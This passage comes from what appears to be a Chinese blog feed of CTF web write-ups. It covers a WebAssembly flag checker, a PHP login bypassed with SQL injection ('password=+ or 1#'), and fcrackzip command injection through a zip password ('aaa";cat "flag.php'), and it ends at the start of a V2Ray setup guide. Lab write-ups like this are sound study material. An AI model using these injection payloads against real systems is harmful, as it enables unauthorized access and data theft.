w2c_i1;</span><br><span class="line">    w2c_i1 = w2c_l1;</span><br><span class="line">    w2c_i0 |= w2c_i1;</span><br><span class="line">    w2c_l1 = w2c_i0;</span><br><span class="line">    w2c_i0 = w2c_l2;</span><br><span class="line">    w2c_i1 = <span class="number">1u</span>;</span><br><span class="line">    w2c_i0 += w2c_i1;</span><br><span class="line">    w2c_l2 = w2c_i0;</span><br><span class="line">    w2c_i1 = <span class="number">23u</span>;</span><br><span class="line">    w2c_i0 = w2c_i0 != w2c_i1;</span><br><span class="line">    <span class="keyword">if</span> (w2c_i0) &#123;<span class="keyword">goto</span> w2c_L0;&#125;</span><br><span class="line">  w2c_i0 = w2c_l1;</span><br><span class="line">  w2c_i0 = !(w2c_i0);</span><br><span class="line">  FUNC_EPILOGUE;</span><br><span class="line">  <span class="keyword">return</span> w2c_i0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 data_segment_data_0[] = &#123;</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x2e</span>, <span class="number">0x23</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x0a</span>, <span class="number">0x27</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x15</span>, <span class="number">0x27</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0x3f</span>, <span class="number">0x42</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 data_segment_data_1[] = &#123;</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7b</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x46</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x46</span>, <span class="number">0x61</span>, <span class="number">0x6b</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x00</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_memory</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  wasm_rt_allocate_memory((&amp;w2c_memory), <span class="number">1</span>, <span class="number">65536</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;(w2c_memory.data[<span class="number">16u</span>]), data_segment_data_0, <span class="number">23</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;(w2c_memory.data[<span class="number">48u</span>]), data_segment_data_1, <span class="number">21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_table</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> offset;</span><br><span class="line">  wasm_rt_allocate_table((&amp;w2c_T0), <span class="number">0</span>, <span class="number">4294967295</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line"><span class="keyword">wasm_rt_memory_t</span> (*WASM_RT_ADD_PREFIX(Z_memory));</span><br><span class="line"><span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line">u32 (*WASM_RT_ADD_PREFIX(Z_get_bufZ_iv))(<span class="keyword">void</span>);</span><br><span class="line"><span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line">u32 (*WASM_RT_ADD_PREFIX(Z_check_flagZ_ii))(u32);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_exports</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_memory) = (&amp;w2c_memory);</span><br><span class="line">  <span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_get_bufZ_iv) = (&amp;w2c_get_buf);</span><br><span class="line">  <span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_check_flagZ_ii) = (&amp;w2c_check_flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WASM_RT_ADD_PREFIX</span><span class="params">(init)</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  init_func_types();</span><br><span class="line">  init_globals();</span><br><span class="line">  init_memory();</span><br><span class="line">  init_table();</span><br><span class="line">  init_exports();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反编译出来的C源码还是很复杂，可以将其再次编译成可执行文件，用IDA打开反编译进行静态分析。再次编译需要使用“wasm-rt.h，wasm-rt-impl.c，wasm-rt-impl.h”这三个文件，可以在wasm2c的位置下找到。</p><p>由于在前端源码里主要调用了check_flag函数去检查flag，所以直接看check_flag函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">w2c_check_flag</span><span class="params">(<span class="keyword">int</span> buf_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> f; <span class="comment">// ST24_1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ++wasm_rt_call_stack_depth &gt; <span class="number">0x1F4</span>u )</span><br><span class="line">    wasm_rt_trap(<span class="number">7L</span>L);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    f = i32_load8_u(&amp;w2c_memory, i + buf_addr);  <span class="comment">// 取出flag里第i个字符</span></span><br><span class="line">    result |= (i32_load8_u(&amp;w2c_memory, i++ + <span class="number">16</span>) ^ f) ^ <span class="number">0x42</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i != <span class="number">23</span> );</span><br><span class="line">  --wasm_rt_call_stack_depth;</span><br><span class="line">  <span class="keyword">return</span> result == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的buf_addr是在前端中调用了get_buf函数获取的，该函数直接返回了80</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">w2c_get_buf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ++wasm_rt_call_stack_depth &gt; <span class="number">0x1F4</span>u )</span><br><span class="line">    wasm_rt_trap(<span class="number">7L</span>L);</span><br><span class="line">  --wasm_rt_call_stack_depth;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">80L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后需要result为0，根据同或的性质，result在循环中每次迭代时都需要为0，最后的结果才能使0，所以表达式<code>(i32_load8_u(&amp;w2c_memory, i++ + 16) ^ f) ^ 0x42;</code>将恒为0。</p><p>根据异或的性质，则表达式<code>i32_load8_u(&amp;w2c_memory, i++ + 16) ^ f</code>将恒为0x42。</p><p>根据异或的交换律<code>f = i32_load8_u(&amp;w2c_memory, i + 16) ^ 0x42</code></p><p>flag位于从w2c_memory第16位开始，长度为23，这里的w2c_memory在init_memory函数中初始化，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_memory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  wasm_rt_allocate_memory(&amp;w2c_memory, <span class="number">1L</span>L, <span class="number">0x10000</span>LL);</span><br><span class="line">  v0 = w2c_memory + <span class="number">16</span>;</span><br><span class="line">  *v0 = data_segment_data_0;</span><br><span class="line">  *(v0 + <span class="number">8</span>) = <span class="number">0x3131032027152D2E</span>LL;</span><br><span class="line">  *(v0 + <span class="number">16</span>) = <span class="number">0x2E202F27</span>;</span><br><span class="line">  *(v0 + <span class="number">20</span>) = <span class="number">0x3F3B</span>;</span><br><span class="line">  *(v0 + <span class="number">22</span>) = <span class="number">0x42</span>;</span><br><span class="line">  v1 = w2c_memory + <span class="number">48</span>;</span><br><span class="line">  *v1 = data_segment_data_1;</span><br><span class="line">  *(v1 + <span class="number">8</span>) = <span class="number">0x46734967616C4673</span>LL;</span><br><span class="line">  *(v1 + <span class="number">16</span>) = <span class="number">0x7D656B61</span>;</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  *(v1 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>w2c_memory第16为开始被赋值为data_segment_data_0，data_segment_data_0的定义为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 data_segment_data_0[] = &#123;</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x2e</span>, <span class="number">0x23</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x0a</span>, <span class="number">0x27</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x15</span>, <span class="number">0x27</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0x3f</span>, <span class="number">0x42</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但是从data_segment_data_0的第8位开始又被赋予了新值，纠正后的结果为[0x24, 0x2e, 0x23, 0x25, 0x39, 0x0a, 0x27, 0x2e, 0x2e, 0x2d, 0x15, 0x27, 0x20, 0x03, 0x31, 0x31, 0x27, 0x2f, 0x20, 0x2e, 0x3b, 0x3f, 0x42]</p><p>最后得到flag<code>flag&#123;HelloWebAssembly&#125;</code></p><hr><h1 id="Confused-question-225"><a href="#Confused-question-225" class="headerlink" title="Confused question(225)"></a>Confused question(225)</h1><p>直接看前端源码给了两个hint</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--register.php?username=xxx will reg a new user for you with password &#x27;123&#x27;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--login.php.txt--&gt;</span></span><br></pre></td></tr></table></figure><p>先看login.php.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashesForEvery</span>(<span class="params">$array</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!is_array($array))&#123;<span class="keyword">return</span> addslashes($array);&#125;</span><br><span class="line"><span class="keyword">foreach</span>($array <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line">$array[$key] = addslashes($val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line">$loginStr = $_GET[<span class="string">&#x27;loginstr&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;admin&#x27;</span>]))&#123;$loginStr = str_ireplace(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>,$loginStr);&#125;</span><br><span class="line">parse_str($loginStr,$loginStr);</span><br><span class="line"><span class="keyword">foreach</span>($loginStr <span class="keyword">as</span> $n =&gt; $v)&#123;</span><br><span class="line">$v = addslashesForEvery($v);</span><br><span class="line"><span class="keyword">if</span>($n === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">$username = $v[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = addslashesForEvery($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">$sql = <span class="string">&quot;select * from admin where username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">$result = $DB-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;$_SESSION[<span class="string">&#x27;adminlogin&#x27;</span>] = <span class="number">1</span>; <span class="keyword">echo</span> $flag;&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($n === <span class="string">&#x27;guest&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello Guest!But you cannot log in!&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了拿到flag需要n==admin，并且sql查询需要成功。首先str_ireplace将loginStr中的所有的admin都替换为guest，这里可以用GET数组绕过，例如<code>?loginstr[admin]=123</code>，parse_str无法处理数组，那么$logStr就为<code>[&#39;admin&#39;=&gt;&#39;123&#39;]</code>，满足n==admin。过了第一个条件以后就需要先办法让sql查询成功，由于没给注册，所以只能考虑sql注入。</p><p>使用GET数组虽然绕过了n==admin这个条件，但是v就不是一个数组了，只是一个字符串，这时如果把一个字符串当成数组取值的话php会将该字符串的第一个字符当作值取出，如果<code>?loginstr[admin]=&#39;</code>的话，addslashesForEvery将v过滤以后就变成了<code>\&#39;</code>，这时取出的第一个字符为反斜杠，带入sql语句就变成了<code>select * from admin where username = &#39;\&#39; and password = &#39;$password&#39;</code>，这里的反斜杠将username后的单引号转义，因此username就变成了<code>\&#39; and password = </code>，password就逃脱了单引号的限制，可以从password进行sql注入，最后的payload为<br>GET<code>?loginstr[admin]=&#39;</code>，POST<code>password=+ or 1#</code>，带入sql语句为<br><code>select * from admin where username = &#39;\&#39; and password = &#39; or 1#&#39;</code></p><p>最后拿到flag<code>flag&#123;pHP_H4s_s0_m4Ny_f3a7ur3s&#125;</code></p><hr><h1 id="ZipCracker-225"><a href="#ZipCracker-225" class="headerlink" title="ZipCracker(225)"></a>ZipCracker(225)</h1><p>题目说有源码泄露，先扫一下发现.index.php.swp文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf<span class="number">-8</span>&gt;</span><br><span class="line">&lt;title&gt;ZipCracker - Crack Your Zip Online&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/foundation/6.2.1/foundation.min.css&quot;</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/zipcracker.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;main&quot;&gt;</span><br><span class="line">&lt;div class=&quot;top-bar&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;top-bar-title&quot;&gt;ZipCracker&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) <span class="keyword">and</span> !<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(max($_FILES[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;size&#x27;</span>], $_FILES[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]) &lt;= <span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">                <span class="comment">// Do you remember 430387 ?</span></span><br><span class="line">                $zip = $_FILES[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                $dict = $_FILES[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                $option = <span class="string">&quot;-D -p <span class="subst">$dict</span>&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;unzip&#x27;</span>])) &#123;</span><br><span class="line">                        $option = <span class="string">&quot;-u &quot;</span>.$option;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $cmd = <span class="string">&quot;timeout 3 ./fcrackzip-1.0/fcrackzip <span class="subst">$option</span> <span class="subst">$zip</span>&quot;</span>;</span><br><span class="line">                $res = shell_exec($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = <span class="string">&#x27;file is too large.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        $res = <span class="string">&#x27;file is missing&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class=&quot;container-wrapper&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">                &lt;h1 class=&quot;container-head&quot;&gt;</span><br><span class="line">                        Crack Your ZIP Online</span><br><span class="line">                &lt;/h1&gt;</span><br><span class="line">                &lt;p class=&quot;container-subhead&quot;&gt;</span><br><span class="line">                        Only dictionary-based crack is available.&lt;br&gt;</span><br><span class="line">                        Both zip <span class="keyword">and</span> dictionary file must not exceed <span class="number">1</span>MB.</span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">                &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">                        &lt;label for=&quot;zip&quot; class=&quot;button&quot;&gt;ZIP file&lt;/label&gt;</span><br><span class="line">                        &lt;input id=&quot;zip&quot; type=&quot;file&quot; name=&quot;zip&quot; class=&quot;show-for-sr&quot;&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;label for=&quot;dict&quot; class=&quot;button&quot;&gt;Dictionary file&lt;/label&gt;</span><br><span class="line">                        &lt;input id=&quot;dict&quot; type=&quot;file&quot; name=&quot;dict&quot; class=&quot;show-for-sr&quot;&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;input id=<span class="string">&quot;unzip&quot;</span> type=<span class="string">&quot;checkbox&quot;</span> name=<span class="string">&quot;unzip&quot;</span>&gt;</span><br><span class="line">                        &lt;label <span class="keyword">for</span>=<span class="string">&quot;unzip&quot;</span>&gt;<span class="keyword">use</span> <span class="title">unzip</span>&lt;/<span class="title">label</span>&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">success</span> <span class="title">button</span>&quot;&gt;<span class="title">Crack</span>&lt;/<span class="title">button</span>&gt;</span><br><span class="line">                &lt;/<span class="title">form</span>&gt;</span><br><span class="line">                &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">res</span>?&gt;&lt;/<span class="title">p</span>&gt;</span><br><span class="line">        &lt;/<span class="title">div</span>&gt;</span><br><span class="line">&lt;/<span class="title">div</span>&gt;</span><br><span class="line">&lt;/<span class="title">div</span>&gt;</span><br><span class="line">&lt;/<span class="title">body</span>&gt;</span><br><span class="line">&lt;/<span class="title">html</span>&gt;</span><br></pre></td></tr></table></figure><p>最直观的有一个<code>shell_exec($cmd);</code>，但是这里cmd命令里面的所有可控输入都是文件的tmp_name，所以无法直接命令注入，但是这里使用了fcrackzip破解zip密码，而fcrackzip存在命令注入漏洞，当fcrackzip开启unzip选项时并且找到密码时，fcrackzip会直接使用该密码解压破解的zip文件，而fcrackzip正是直接使用了shell的unzip命令，将password带入命令行中没有做任何过滤，因此这里存在一个命令注入漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> REGPARAM <span class="title">check_unzip</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span> (buff, <span class="string">&quot;unzip -qqtP \&quot;%s\&quot; %s &quot;</span> DEVNULL, pw, file_path[<span class="number">0</span>]);</span><br><span class="line">    status = system (buff);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> REDIR</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status == EXIT_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\nPASSWORD FOUND!!!!: pw == %s\n&quot;</span>, pw);</span><br><span class="line">        <span class="built_in">exit</span> (EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以给zip文件设置密码<code>aaa&quot;;cat &quot;flag.php</code>来执行命令拿到flag，提交的时候记得选择use unzip。得到flag为<code>flag&#123;bug_430387_cmd_injection&#125;</code></p><hr>]]></content>
    
    
    <summary type="html">BlueWhale OpenJudge Web Challenge WriteUp Part 1. Including &quot;Welcome to web&quot;, &quot;Calculator&quot;, &quot;RapidTyping&quot;, &quot;XSS1&quot;, &quot;XSS 2&quot;, &quot;Basic SQL&quot;, &quot;Basic PHP&quot;, &quot;Basic PHP 2&quot;, &quot;BabyXSS&quot;, &quot;BasicFileInclude&quot;, &quot;FxxkingBackdoor&quot;, &quot;Global Page&quot;, &quot;BabyCrack&quot;, &quot;Baby Reverse&quot;, &quot;Confused question&quot;, &quot;ZipCracker&quot;.</summary>
    
    
    
    <category term="CTF" scheme="https://srpopty.github.io/categories/CTF/"/>
    
    
    <category term="BlueWhale" scheme="https://srpopty.github.io/tags/BlueWhale/"/>
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>V2Ray搭建记录</title>
    <link href="https://srpopty.github.io/2019/09/25/V2Ray%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>https://srpopty.github.io/2019/09/25/V2Ray%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</id>
    <published>2019-09-25T12:11:40.000Z</published>
    <updated>2020-08-11T08:56:02.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>注意：首先需要有一台没有被封的VPS</p><h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><ol><li>登录VPS</li><li>下载官方提供的安装脚本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://install.direct/go.sh</span><br></pre></td></tr></table></figure></li><li>安装<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash go.sh</span><br></pre></td></tr></table></figure>如果安装失败，会出现红色字体的提示，基本都可以自己手动解决</li></ol><h2 id="Client-Windows"><a href="#Client-Windows" class="headerlink" title="Client(Windows)"></a>Client(Windows)</h2><ol><li>在<a href="https://github.com/v2ray/v2ray-core/releases">这里</a>下载v2ray-windows-64.zip</li><li>解压</li></ol><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="Server-1"><a href="#Server-1" class="headerlink" title="Server"></a>Server</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/v2ray/config.json</span><br></pre></td></tr></table></figure><p>配置文件如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 